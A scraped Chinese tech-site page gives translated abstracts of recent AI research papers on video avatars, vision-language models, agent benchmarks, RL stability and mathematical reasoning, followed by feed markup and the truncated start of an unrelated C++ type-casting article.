<p>现有基于扩散模型的视频生成方法，从根本上受限于顺序计算和长时不一致性问题，制约了其在实时流式音频驱动虚拟形象合成中的实际采用。我们提出了 Live Avatar，一个算法-系统协同设计框架，能够利用一个 140 亿参数的扩散模型，实现高效、高保真且无限长度的虚拟形象生成。我们的方法引入了时间步强制流水线并行 (Timestep-forcing Pipeline Parallelism, TPP)，这是一种分布式推理范式，它跨多个 GPU 对去噪步骤进行流水线处理，从而有效打破自回归瓶颈，确保稳定、低延迟的实时流生成。为了进一步增强时间一致性，并缓解身份漂移和颜色伪影问题，我们提出了滚动锚定帧机制 (Rolling Sink Frame Mechanism, RSFM)，该机制通过利用缓存的参考图像动态重校准外观，以维持序列保真度。此外，我们采用自强制分布匹配蒸馏技术，在不牺牲视觉质量的前提下，实现了大规模模型的因果性、可流式化适配。Live Avatar 展现了最先进的性能，在 5 块 H800 GPU 上实现了 20 FPS 的端到端生成速度。据我们所知，这是首个在此参数量级上实现实用化、实时、高保真虚拟形象生成的工作。我们的研究为在工业级长视频合成应用中部署先进扩散模型确立了一种新范式。</p>
<h2 data-id="heading-5">DAComp: 全数据智能生命周期数据智能体基准测试</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fabs%2F2512.04324" target="_blank" title="https://arxiv.org/abs/2512.04324" ref="nofollow noopener noreferrer">DAComp: 全数据智能生命周期数据智能体基准测试</a></p>
<p>现实中的企业数据智能工作流涵盖两大环节：一是将原始数据源转化为可供分析表格的<strong>数据工程</strong>，二是将这些表格转化为决策洞察的<strong>数据分析</strong>。为此，我们提出了DAComp基准，它包含210个任务，旨在模拟这些复杂的工作流。数据工程（DE）任务要求对工业级数据模式进行仓库层面的工程操作，包括从零开始设计和构建多阶段SQL管道，以及在需求演进时对现有系统进行改造。数据分析（DA）任务则提出开放式的业务问题，要求进行战略规划、通过迭代编码进行探索性分析、解读中间结果，并最终综合出可执行的建议。工程类任务采用基于执行的多指标评估体系进行评分。开放式任务则由一个经过实验验证的、可靠的LLM-judge进行评估，该评估器遵循一套分层且精心设计的评分标准。</p>
<p>我们的实验表明，即使是当前最先进的AI智能体在DAComp上也表现欠佳。数据工程任务的表现尤其低下，成功率不足20%，这暴露了在整体管道编排（而不仅仅是代码生成）方面存在关键瓶颈。数据分析任务的平均得分也低于40%，突显了智能体在开放式推理方面存在严重不足，并证明工程能力与分析能力是两种截然不同的技能。通过清晰地诊断这些局限，DAComp为开发真正适用于企业环境的、能力全面的自主数据智能体提供了一个严谨且贴近现实的测试平台。我们的数据与代码公开于 <a href="https://link.juejin.cn?target=https%3A%2F%2Fda-comp.github.io%25E3%2580%2582" target="_blank" title="https://da-comp.github.io%E3%80%82" ref="nofollow noopener noreferrer">da-comp.github.io。</a></p>
<h2 data-id="heading-6">Qwen3-VL Technical Report</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fabs%2F2511.21631" target="_blank" title="https://arxiv.org/abs/2511.21631" ref="nofollow noopener noreferrer">Qwen3-VL 技术报告</a></p>
<p>我们推出 Qwen3-VL，这是 Qwen 系列迄今为止能力最强的视觉语言模型 (Vision-Language Model)，在广泛的多模态基准测试中均取得了卓越性能。该模型原生支持高达 256K token 的交错多模态上下文，能够无缝融合文本、图像与视频输入。模型系列包含密集 (2B/4B/8B/32B) 与专家混合 (Mixture-of-Experts, MoE) (30B-A3B/235B-A22B) 两种架构变体，以满足不同场景下对延迟与质量的权衡需求。Qwen3-VL 的核心优势体现在三个方面：(i) 显著增强的纯文本理解能力，在多项测试中超越了同等规模的纯文本骨干模型；(ii) 强大的长上下文理解能力，其原生 256K token 窗口同时支持纯文本及交错的多模态输入，可对长文档和视频内容实现准确的信息保持、检索与交叉引用；(iii) 先进的跨模态推理能力，在单图、多图及视频任务上均表现优异，在 MMMU 及视觉数学基准 (如 MathVista 和 MathVision) 等综合评估中取得了领先的性能表现。在模型架构层面，我们进行了三项关键升级：(i) 引入增强型交错-MRoPE (interleaved-MRoPE)，以提升对图像与视频的时空建模能力；(ii) 集成 DeepStack 模块，通过有效利用多层次 ViT 特征来强化视觉与语言的对齐；(iii) 为视频任务设计了基于文本的时间对齐机制，从 T-RoPE 演进为显式的文本时间戳对齐，从而实现更精准的时序定位。在相近的 token 预算与延迟约束下，Qwen3-VL 在密集与 MoE 架构中均展现出卓越的性能。我们期待 Qwen3-VL 能够成为实际工作流中，支撑图像推理、智能体决策以及多模态代码智能的基础引擎。</p>
<h2 data-id="heading-7">ToolOrchestra: 通过高效的模型与工具编排增强智能</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fabs%2F2511.21689" target="_blank" title="https://arxiv.org/abs/2511.21689" ref="nofollow noopener noreferrer">ToolOrchestra: 通过高效的模型与工具编排增强智能</a></p>
<p>大语言模型 (LLM) 是强大的通用系统，但在解决诸如“人类终极考试” (Humanity's Last Exam, HLE) 这类深刻且复杂的问题时，仍面临概念上的挑战和较高的计算成本。我们的研究表明，通过小型编排器来管理其他模型与多样化工具，不仅能够突破智能水平的极限，还能提升解决复杂 AI 智能体 (AI Agent) 任务的效率。本文提出了 ToolOrchestra，一种用于训练小型编排器以协调智能工具的方法。该方法明确采用强化学习，并设计了基于结果、效率和用户偏好的奖励机制。基于 ToolOrchestra，我们训练出了 Orchestrator，这是一个拥有 80 亿参数的模型。对于给定的查询，Orchestrator 能以比以往的工具使用智能体更低的成本获得更高的准确率，同时其工具选择行为能与用户偏好保持一致。在 HLE 基准测试中，Orchestrator 取得了 37.1% 的得分，超越了 GPT-5 (35.1%)，并且效率是后者的 2.5 倍。在 tau2-Bench 和 FRAMES 基准上，Orchestrator 以显著优势领先于 GPT-5，而成本仅约为后者的 30%。深入分析表明，Orchestrator 在多项指标下实现了性能与成本的最佳权衡，并且对未见过的工具展现出强大的泛化能力。这些结果证明，利用轻量级编排模型组合多样化工具，相比现有方法不仅效率更高，而且效果更好，从而为构建实用、可扩展的工具增强推理系统铺平了道路。</p>
<h2 data-id="heading-8">Envision: 面向因果世界过程洞察的统一理解与生成基准</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fabs%2F2512.01816" target="_blank" title="https://arxiv.org/abs/2512.01816" ref="nofollow noopener noreferrer">Envision: 面向因果世界过程洞察的统一理解与生成基准</a></p>
<p>当前的多模态模型旨在通过统一理解与生成来克服单模态表示的局限，通常采用文本到图像 (T2I) 任务来确保语义一致性。然而，其在训练和评估中对静态单图像生成的依赖，导致了对静态模式匹配与语义融合的过拟合，同时也从根本上限制了模型对随时间演变的动态过程进行建模的能力。为应对这些局限，我们提出了 Envision——一个用于链式文本到多图像生成的因果事件进展基准。该基准基于世界知识，并以时空因果关系为结构，它整合了现有的评估维度，并包含了涵盖六个科学与人文领域的 1000 个四阶段提示。为了将评估从单图像扩展到序列帧，并检验模型是否在遵循因果-时间约束的同时真正内化了世界知识，我们引入了 Envision-Score，这是一个综合了多维一致性、物理合理性与美学质量的整体评估指标。对 15 个模型 (10 个专用 T2I 模型，5 个统一模型) 的全面评估表明：专用 T2I 模型在美学渲染上表现熟练，但缺乏深层的世界知识。统一多模态模型则弥补了这一不足，在因果叙事连贯性上持续优于专用模型。然而，即便是这些统一架构，其性能仍落后于闭源模型，且难以克服时空一致性的核心挑战。这表明，专注于因果孤立的单图像会阻碍多帧推理与生成，导致模型偏向于静态模式匹配而非动态世界建模，最终限制了世界知识的内化与内容的生成。</p>
<h2 data-id="heading-9">Stabilizing Reinforcement Learning with LLMs: Formulation and Practices</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fabs%2F2512.01374" target="_blank" title="https://arxiv.org/abs/2512.01374" ref="nofollow noopener noreferrer">使用大语言模型稳定强化学习：公式化与方法</a></p>
<p>本文提出了一种基于大语言模型 (LLM) 的强化学习 (RL) 新公式，阐释了为何以及何种条件下，可以通过 REINFORCE 等策略梯度方法中的代理 token 级别目标函数来优化真实的序列级别奖励。具体而言，通过一阶近似分析，我们证明，只有当训练-推断差异与策略滞后性均被最小化时，该代理目标函数的有效性才能得到保证。这一见解从原理上解释了几种广泛采用的 RL 训练稳定化技术的关键作用，包括重要性采样校正、梯度裁剪，以及特别针对混合专家 (Mixture-of-Experts, MoE) 模型的路由重放。通过在一个总计消耗数十万 GPU 小时的 300 亿参数 MoE 模型上进行大量实验，我们发现：对于同策略 (on-policy) 训练，带有重要性采样校正的基本策略梯度算法能实现最高的训练稳定性。而当引入异策略 (off-policy) 更新以加速收敛时，结合梯度裁剪与路由重放对于缓解因策略滞后性引起的不稳定性至关重要。值得注意的是，一旦训练趋于稳定，无论采用何种冷启动初始化方式，持续优化总能获得相当的最终性能。我们希望，所分享的见解与开发的稳定 RL 训练方案能促进未来的研究。</p>
<h2 data-id="heading-10">DeepSeekMath-V2: Towards Self-Verifiable Mathematical Reasoning</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fabs%2F2511.22570" target="_blank" title="https://arxiv.org/abs/2511.22570" ref="nofollow noopener noreferrer">DeepSeekMath-V2: 迈向可自我验证的数学推理</a></p>
<p>大语言模型在数学推理方面取得了显著进展。数学推理是人工智能的一个重要测试平台，其进一步发展可能影响科学研究。通过采用奖励最终正确答案的强化学习来扩展推理能力，大语言模型在一年内从性能不佳提升到在 AIME、HMMT 等定量推理竞赛中达到性能饱和。然而，这种方法存在根本性局限。追求更高的最终答案准确率无法解决一个关键问题：正确答案并不能保证推理过程正确。此外，许多数学任务（如定理证明）需要严格的逐步推导，而非仅仅给出数值答案，这使得基于最终答案的奖励机制无法适用。为了突破深度推理的瓶颈，我们认为有必要对数学推理的全面性和严谨性进行验证。自我验证对于扩展测试阶段的计算资源尤为重要，特别是对于那些没有已知解的开放性问题。为实现可自我验证的数学推理，我们研究了如何训练一个准确、可靠的大语言模型验证器用于定理证明。接着，我们以该验证器作为奖励模型来训练一个证明生成器，并激励生成器在最终确定证明前，尽可能多地识别并解决自身证明中的问题。为防止生成器能力增强导致生成与验证之间的差距缩小，我们提出通过增加验证阶段的计算资源，自动标注新产生的、难以验证的证明，从而创建训练数据以持续改进验证器。由此得到的模型 DeepSeekMath-V2 展现出强大的定理证明能力：在增加测试阶段计算资源的情况下，它在 IMO 2025 和 CMO 2024 上获得了金牌级分数，并在 Putnam 2024 上取得了接近满分的 118/120 分。</p>
<h2 data-id="heading-11">Nex-N1: 通过大规模环境构建的统一生态系统训练的智能体模型</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fabs%2F2512.04987" target="_blank" title="https://arxiv.org/abs/2512.04987" ref="nofollow noopener noreferrer">Nex-N1: 通过大规模环境构建的统一生态系统训练的智能体模型</a></p>
<p>大语言模型 (LLMs) 从被动响应者向自主智能体的演进，要求学习范式发生根本性转变——即从静态模仿转向激励驱动的决策。然而，由于缺乏能够为有效策略学习生成高质量交互信号的可扩展基础设施，这一转变受到了严重阻碍。为解决此问题，我们提出了一种综合性方法，旨在系统化地提升交互环境的多样性和复杂性。该方法通过解决三个相互独立且互补的维度来实现规模化构建：(1) 复杂性：NexAU，一个灵活的智能体框架，支持通过简单配置构建复杂的智能体层次结构；(2) 多样性：NexA4A 能够从自然语言自动生成多样化的智能体层次结构，从而覆盖无限领域；(3) 保真度：NexGAP 通过集成动态的真实世界环境来合成具身轨迹，以此弥合仿真与现实之间的鸿沟。我们基于该基础设施所建立的多样且复杂的交互环境对 Nex-N1 进行了训练。在 SWE-bench 和 tau2 等基准测试上的实证结果表明，Nex-N1 始终优于最先进的开源模型，并且在复杂的智能体任务上，其性能可与前沿的专有模型相竞争。我们开源了 Nex 生态系统及模型权重，以推动相关领域的进一步研究。</p>
<h2 data-id="heading-12">MultiShotMaster: 可控多镜头视频生成框架</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fabs%2F2512.03041" target="_blank" title="https://arxiv.org/abs/2512.03041" ref="nofollow noopener noreferrer">MultiShotMaster: 可控多镜头视频生成框架</a></p>
<p>当前的视频生成技术擅长生成单镜头片段，但难以生成具有叙事性的多镜头视频。这类视频需要灵活的镜头安排、连贯的叙事逻辑以及超越文本描述的控制能力。为应对这些挑战，我们提出了 MultiShotMaster，一个具备高可控性的多镜头视频生成框架。我们通过集成两种新颖的 RoPE (Rotary Position Embedding) 变体，扩展了一个预训练的单镜头模型。首先，我们引入了多镜头叙事 RoPE，它在镜头切换时施加显式的相位偏移，从而在维持时序叙事的前提下实现灵活的镜头编排。其次，我们设计了时空位置感知 RoPE，以融入参考 token 和 grounding (接地) 信号，从而实现基于时空位置的参考信息注入。此外，为克服数据稀缺问题，我们构建了一套自动化数据标注流水线，用于从视频数据中解析出多镜头视频片段、对应字幕、跨镜头 grounding 信号以及参考图像。我们的框架利用其内在的架构特性来支持多镜头视频生成，主要特点包括：文本驱动的镜头间一致性、支持运动控制的自定义主体（如物体或角色），以及背景驱动的自定义场景。镜头数量和时长均可灵活配置。大量实验表明，我们的框架在性能和可控性方面均表现优异。</p>
<h2 data-id="heading-13">Deep Research: A Systematic Survey</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fabs%2F2512.02038" target="_blank" title="https://arxiv.org/abs/2512.02038" ref="nofollow noopener noreferrer">深度研究：一项系统性综述</a></p>
<p>大语言模型（LLMs）已迅速从文本生成工具演变为强大的问题求解器。然而，许多开放性任务要求具备批判性思维、整合多源信息并产生可验证的输出，这超出了单次提示（single-shot prompting）或标准检索增强生成（RAG）的能力范围。近期，大量研究开始探索深度研究（Deep Research， DR），其核心目标是将大语言模型的推理能力与搜索引擎等外部工具相结合，从而赋能大语言模型成为能够完成复杂、开放式任务的研究智能体（research agents）。本综述对深度研究系统进行了全面而系统的梳理，内容涵盖清晰的路线图、基础组件、实际实现技术、关键挑战以及未来方向。具体而言，我们的主要贡献如下：（i）形式化了一个三阶段路线图，并明确了深度研究与相关范式的区别；（ii）介绍了四个关键组件：查询规划、信息获取、记忆管理与答案生成，并为每个组件提供了细粒度的子类别划分；（iii）总结了包括提示工程、监督微调以及智能体强化学习在内的优化技术；（iv）整合了相关的评估标准与开放挑战，旨在为未来的发展提供指导与便利。鉴于深度研究领域正在快速发展，我们将持续维护并更新本综述，以同步反映该领域的最新进展。</p>
<h2 data-id="heading-14">How Far Are We from Genuinely Useful Deep Research Agents?</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fabs%2F2512.01948" target="_blank" title="https://arxiv.org/abs/2512.01948" ref="nofollow noopener noreferrer">我们距离真正有用的深度研究智能体还有多远？</a></p>
<p>深度研究智能体 (Deep Research Agents, DRAs) 旨在通过迭代的信息检索与综合，自动生成分析师级别的报告。然而，现有的大多数 DRAs 仅在问答基准上进行验证，而生成综合性报告的研究仍被忽视。更严重的是，当前用于报告综合的基准存在任务复杂性和评估指标主观性强的问题，这既无法反映真实用户需求，也限制了生成报告的实际效用。为弥补这些不足，我们提出了细粒度深度研究基准 (Fine-grained DEepResearch bench, FINDER)。该基准经过增强，包含 100 个人工精心策划的研究任务，并配有 419 个结构化检查项，用以标准化报告的结构、分析深度和事实依据。基于主流 DRAs 生成的大约 1,000 份报告，我们进一步提出了深度研究失败分类法 (Deep rEsearch Failure Taxonomy, DEFT)，这是首个专门针对深度研究智能体的失败模式分类体系。DEFT 涵盖了推理、检索和生成三个方面的 14 种细粒度失败模式，其构建基于扎根理论，并采用了人工与大语言模型协同标注以及标注者间一致性检验。我们的实验结果表明，当前 DRAs 的主要挑战并非任务理解，而是证据整合、验证以及在推理过程中保持稳健的规划能力。</p>
<h2 data-id="heading-15">TUNA: 构建统一视觉表示以实现原生统一多模态模型</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fabs%2F2512.02014" target="_blank" title="https://arxiv.org/abs/2512.02014" ref="nofollow noopener noreferrer">TUNA: 构建统一视觉表示以实现原生统一多模态模型</a></p>
<p>统一多模态模型 (UMMs) 旨在单个框架内同时实现多模态理解与生成。我们提出了 TUNA，一个原生 UMM，它通过将 VAE 编码器与表示编码器级联，构建了一个统一的连续视觉表示。这一统一的表示空间支持对图像和视频进行端到端处理，以同时服务于理解和生成任务。与先前采用解耦表示的 UMMs 相比，TUNA 的统一视觉空间避免了因使用独立编码器而导致的表示格式不匹配问题，从而在理解和生成任务上均优于解耦方案。此外，我们发现，性能更强的预训练表示编码器能够在所有多模态任务上持续带来更优的性能，这凸显了表示编码器的重要性。最后，在这种统一框架下，联合使用理解和生成数据进行训练，能使两项任务相互促进而非相互干扰。我们在多模态理解与生成基准测试上进行了大量实验，结果表明，TUNA 在图像与视频理解、图像与视频生成以及图像编辑任务上均取得了最先进的性能，充分证明了其统一表示设计的有效性和可扩展性。</p>
<h2 data-id="heading-16">引导式大语言模型自进化：最小化人类监督</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fabs%2F2512.02472" target="_blank" title="https://arxiv.org/abs/2512.02472" ref="nofollow noopener noreferrer">引导式大语言模型自进化：最小化人类监督</a></p>
<p>人工智能 (AI) 自进化 (self-evolution) 一直被视作通向超级智能的途径，即模型能够从其自身学习经验中自主地获取、优化并内化知识。然而，实际应用中，无引导的自进化系统往往很快陷入性能平台期，甚至在训练过程中发生退化。这些失败源于概念漂移 (concept drift)、多样性崩溃 (diversity collapse) 和错误进化 (mis-evolution) 等问题，因为模型会不断强化自身偏见，并收敛到低熵 (low-entropy) 行为。为了在最小化对人类监督依赖的同时，实现模型稳定、可控的自进化，我们提出了 R-Few：一个引导式的自我对弈 (Self-Play) 挑战者-求解器 (Challenger-Solver) 框架。该框架通过基于上下文的锚定 (in-context grounding) 和混合训练 (mixed training)，引入了轻量级的人类监督。在每一轮迭代中，挑战者 (Challenger) 会采样一小部分人工标注的示例，用以指导合成问题的生成；而求解器 (Solver) 则遵循一个基于难度的在线课程学习 (online, difficulty-based curriculum) 策略，对人工示例和合成示例进行联合训练。在数学和通用推理基准测试中，R-Few 实现了持续且迭代的性能提升。例如，Qwen3-8B-Base 模型在数学任务上比 R-Zero 提升了 3.0 分，其性能与 General-Reasoner 相当，而后者的训练使用了多达 20 倍以上的人工标注数据。消融研究 (Ablation studies) 证实了基于锚定的挑战者训练 (grounded challenger training) 和基于课程的求解器训练 (curriculum-based solver training) 具有互补作用；进一步分析表明，R-Few 有效缓解了概念漂移，从而产生了更稳定、更可控的协同进化 (co-evolutionary) 动态。</p>
<h2 data-id="heading-17">MG-Nav: Dual-Scale Visual Navigation via Sparse Spatial Memory</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fabs%2F2511.22609" target="_blank" title="https://arxiv.org/abs/2511.22609" ref="nofollow noopener noreferrer">MG-Nav：基于稀疏空间记忆的双尺度视觉导航</a></p>
<p>我们提出了 MG-Nav (Memory-Guided Navigation，记忆引导导航)，这是一个用于零样本视觉导航的双尺度框架，它将全局记忆引导规划与局部几何增强控制相统一。其核心是稀疏空间记忆图 (Sparse Spatial Memory Graph, SMG)，这是一种紧凑的、以区域为中心的记忆结构。其中每个节点聚合了多视角关键帧和对象语义信息，不仅能捕获外观与空间结构，还保留了视角多样性。在全局层面，智能体首先在 SMG 上进行定位，然后通过图像到实例的混合检索，规划出一条以目标为条件的节点路径，从而生成一系列可达的路径点，为长程导航提供引导。在局部层面，一个导航基础策略以点目标模式执行这些路径点，并采用障碍物感知控制；当从最终节点向视觉目标导航时，则切换至图像目标模式。为了进一步提升视角对齐和目标识别的能力，我们引入了 VGGT-adapter。这是一个基于预训练 VGGT 模型构建的轻量级几何模块，能够在共享的 3D 感知空间中对齐观测特征与目标特征。MG-Nav 以不同的频率执行全局规划和局部控制，并利用周期性的重新定位来纠正误差。在 HM3D Instance-Image-Goal 和 MP3D Image-Goal 基准测试上的实验表明，MG-Nav 实现了最先进的零样本性能，并且在动态场景重排和未见过的场景条件下仍能保持鲁棒性。</p>
<h2 data-id="heading-18">视频生成中的重力问题如何解决？利用可验证奖励对模型进行牛顿定律后训练</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fabs%2F2512.00425" target="_blank" title="https://arxiv.org/abs/2512.00425" ref="nofollow noopener noreferrer">视频生成中的重力问题如何解决？利用可验证奖励对模型进行牛顿定律后训练</a></p>
<p>当前的视频扩散模型虽能生成视觉上逼真的片段，却常常违背基本物理定律，例如物体漂浮、加速度异常、碰撞行为不一致等，这揭示了视觉真实感与物理真实感之间存在的持续差距。为此，我们提出了 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext mathvariant="monospace">NewtonRewards</mtext></mrow><annotation encoding="application/x-tex">\texttt{NewtonRewards}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6111em;"/><span class="mord text"><span class="mord texttt">NewtonRewards</span></span></span></span></span></span>，这是首个基于 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext mathvariant="italic">可验证奖励</mtext></mrow><annotation encoding="application/x-tex">\textit{可验证奖励}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord text"><span class="mord textit cjk_fallback">可验证奖励</span></span></span></span></span></span>、以物理学原理为根基的视频生成后训练框架。该框架不依赖人类或视觉语言模型 (VLM) 的反馈，而是利用冻结的工具模型从生成视频中提取 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext mathvariant="italic">可测量的代理量</mtext></mrow><annotation encoding="application/x-tex">\textit{可测量的代理量}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord text"><span class="mord textit cjk_fallback">可测量的代理量</span></span></span></span></span></span>：以光流作为速度的代理，以高级外观特征作为质量的代理。基于这些代理量，我们通过两种互补的奖励机制来显式地强化牛顿力学结构：一是强制执行恒定加速度动力学的牛顿运动学约束奖励，二是防止出现平凡退化解的质量守恒奖励。我们使用新构建的大规模基准数据集 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext mathvariant="monospace">NewtonBench-60K</mtext></mrow><annotation encoding="application/x-tex">\texttt{NewtonBench-60K}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6111em;"/><span class="mord text"><span class="mord texttt">NewtonBench-60K</span></span></span></span></span></span>，在五种牛顿运动基元（自由落体、水平抛射、抛物线抛射、斜坡下滑与上滑）上对 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext mathvariant="monospace">NewtonRewards</mtext></mrow><annotation encoding="application/x-tex">\texttt{NewtonRewards}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6111em;"/><span class="mord text"><span class="mord texttt">NewtonRewards</span></span></span></span></span></span> 进行了评估。在所有基元的视觉与物理指标上，<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext mathvariant="monospace">NewtonRewards</mtext></mrow><annotation encoding="application/x-tex">\texttt{NewtonRewards}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6111em;"/><span class="mord text"><span class="mord texttt">NewtonRewards</span></span></span></span></span></span> 均能持续提升生成视频的物理合理性、运动平滑度与时间连贯性，效果优于已有的后训练方法。此外，在高度、速度、摩擦力等参数发生分布外偏移时，该方法依然能保持强劲的性能。我们的研究结果表明，基于物理学的可验证奖励为实现物理感知的视频生成提供了一条可扩展的路径。</p>
<h2 data-id="heading-19">REASONEDIT: 面向推理增强的图像编辑模型</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fabs%2F2511.22625" target="_blank" title="https://arxiv.org/abs/2511.22625" ref="nofollow noopener noreferrer">REASONEDIT: 面向推理增强的图像编辑模型</a></p>
<p>图像编辑模型近期取得了显著进展。一种常见的架构设计是将多模态大语言模型 (Multimodal Large Language Model, MLLM) 编码器与扩散解码器相结合，例如 Step1X-Edit 和 Qwen-Image-Edit 等系统。在这些系统中，MLLM 负责编码参考图像和编辑指令，但其参数在训练过程中保持冻结。本工作表明，释放 MLLM 的推理能力可以进一步拓展图像编辑模型的性能边界。具体而言，我们探索了两种推理机制——思维 (Thinking) 与反思 (Reflection)，以提升模型对指令的理解能力和编辑准确性。基于此，我们提出了一个思维-编辑-反思循环框架：思维机制利用 MLLM 的世界知识来解析抽象指令，而反思机制则评估编辑结果、自动纠正非预期的修改，并确定停止迭代的时机。大量实验验证了我们推理方法的有效性。当基于 Step1X-Edit 初始化我们的 DiT 模型 (即 ReasonEdit-S) 时，在 ImgEdit (+4.3%)、GEdit (+4.7%) 和 Kris (+8.2%) 基准上均取得了显著提升。此外，当与 Qwen-Image-Edit 结合构建 ReasonEdit-Q 时，其在 GEdit 和 Kris 基准上的表现也超越了此前所有的开源方法。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[C++ 强制类型转换：类型安全的多维工具]]></title>    <link>https://juejin.cn/post/7580310413754318898</link>    <guid>https://juejin.cn/post/7580310413754318898</guid>    <pubDate>2025-12-06T15:11:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580310413754318898" data-draft-id="7580329353353068590" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="C++ 强制类型转换：类型安全的多维工具"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-06T15:11:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="码事漫谈"/> <meta itemprop="url" content="https://juejin.cn/user/1972974802965230"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            C++ 强制类型转换：类型安全的多维工具
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1972974802965230/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    码事漫谈
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T15:11:50.000Z" title="Sat Dec 06 2025 15:11:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body 